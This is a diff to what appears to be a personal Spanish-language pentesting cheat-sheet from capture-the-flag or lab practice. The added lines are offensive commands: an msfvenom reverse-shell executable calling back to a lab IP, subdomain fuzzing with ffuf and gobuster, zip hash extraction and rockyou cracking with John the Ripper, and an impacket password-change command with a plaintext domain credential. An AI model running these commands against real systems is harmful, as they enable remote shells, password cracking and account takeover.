@@ -355,6 +355,9 @@ Por ejemplo, para generar un shell inverso de Windows X64 en un formato EXE, pod
 
 MSFVENOM -P Windows/x64/shell/reverse_tcp -f exe -o shell.exe lhost = <Inding-ip> Lport = <Inding-Port>
 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.3 LPORT=1234 -f exe -o shell.exe
+
+
 linux/x86/shell_reverse_tcp
 
 
@@ -614,6 +617,15 @@ grep -R " "
 
 
 dashboard/api/uploads/
+
+
+
+# DOMINIOS 
+
+ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.nahamstore.thm" -mc all -fw 125
+
+$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u cursodex.thl -t 30 --append-domain
+
 
 
 Using ffuf:
@@ -1347,11 +1359,23 @@ export TERM=  xterm
 
 
 
+┌──(kali㉿kali)-[~/Documents/uploader]
+└─$ zip2john File.zip > hash.txt
+ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
+                                                                                                                                                                                                              
+
+                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/Documents/uploader]
+└─$ cat hash.txt                 
+File.zip/Credentials/Credentials.txt:$zip2$*0*1*0*03b3feaba7e84510*b86b*40*889fd9803132d3fa91c9c997eefb39069fd9920af7b693d59bcc34ebe3f5e72a5b1ebdf582d72d4d7182e2945eba41a3fb169c2a1c8f1efe023d3a4bf1f9a4d8*c0294a7ec60b818784f9*$/zip2$:Credentials/Credentials.txt:File.zip:File.zip
+
+
+┌──(kali㉿kali)-[~/Documents/uploader]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt      
 
 
 
-
-
+====================================================================================================================================================================================
 
 # Descubir host
 
@@ -1393,3 +1417,16 @@ Escaneando red: 192.168.98.0/24 ...
 [+] Host activo: 192.168.98.15
 [+] Host activo: 192.168.98.30
 [+] Host activo: 192.168.98.120
+
+
+
+
+
+
+
+
+
+
+
+
+ impacket-changepasswd 'Folclore/Ix_Chel':'4+9Ii1wK'@192.168.69.9
